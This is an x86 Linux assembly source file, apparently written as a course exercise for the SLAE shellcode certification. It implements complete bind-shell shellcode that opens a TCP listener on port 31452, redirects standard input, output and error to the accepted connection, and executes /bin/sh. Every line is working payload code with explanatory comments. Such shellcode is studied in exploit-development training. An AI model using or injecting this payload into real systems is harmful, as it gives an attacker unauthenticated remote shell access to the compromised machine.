; Filename: bindtcp.nasm
; Author:  msstavros
; Student-ID: SLAE-645 
;
; Purpose: shellcode to create a tcp socket and execute a shell on connect


global _start			

section .text
_start:
	xor eax,eax		;initialize registers
	xor ebx,ebx
	xor ecx,ecx
	
	;socket() call
	mov al, 0x66		;syscall 102, sys_socketcall
	mov bl, 0x01		;socket()
	push 0x06		;IPPROTO_TCP
	push 0x01		;SOCK_STREAM
	push 0x02		;AFINET
	mov ecx,esp		;pointer to parameters
	int 0x80		;syscall

	mov edx,eax		;store sockfd in edx
	
	;bind() call
	xor eax,eax
	xor esi,esi		;initialize esi to use for zero padding
	mov al, 0x66		;sys_socketcall
	inc bl			;bind(), BL was 1 so an inc is all is needed
	
	push esi		;4 bytes, zero padding=4
	push esi		;4 bytes, zero padding=8
	push esi		;4 bytes, zero padding=11+1 for IPADDR_ANY: 00
	push word 0xdc7a	;port 31452=0x7adc -- in reverse order!
	push word 0x02		;AFINET 0x0002
	mov ecx, esp		;pointer of above structure on ecx
	
	push 0x10		;address len of address/port structure
	push ecx		;pointer to structure
	push edx		;socfd descriptor
	mov ecx, esp		;pointer to params
	int 0x80		;syscall

	;listen() call
	xor eax,eax
	mov al, 0x66
	add ebx, 2		;bl was 2 for bind, so just add 2
	push 0x0f		;backlog value
	push edx		;sockfd value
	mov ecx,esp		;pointer to func params on stack
	int 0x80

	;accept() call
	xor eax, eax
	mov al, 0x66
	inc bl			;bl was 4 for listen(), just increment by one
	push esi		;pointer to client socket info
	push esi		;pointer to client socket info length
	push edx		;sockfd
	mov ecx, esp		;pointer of params on stack
	int 0x80		;syscall	

	mov ebx, eax		;store the socket descriptor from accept, in ebx
				;for use in the dup2 calls

	;dup2() syscall
	xor eax, eax		;initialize eax
	xor ecx,ecx		;initialize ecx
	mov cl,0x2		;ecx will also be used for counting backwards.
				;2,1,0 the values for the 3 file descriptors
duploop:
	mov al, 0x3f
	int 0x80
	dec ecx
	jns duploop		;Check if ecx is -1, by checking the Sign Flag is set

	;execve_stack /bin/sh
	xor eax, eax
	push eax		;4 null bytes on stack
	push 0x68732f2f		;/bin//sh on stack
	push 0x6e69622f
	mov ebx, esp		;pointer to command in ebx
	push eax		;4 null bytes, envp pointer
	mov edx, esp		;store it in edx
	push ebx		;again the pointer to /bin/sh
	mov ecx, esp		;store the address to this in ecx
	mov al, 0x0b		;execve
	int 0x80		;syscall





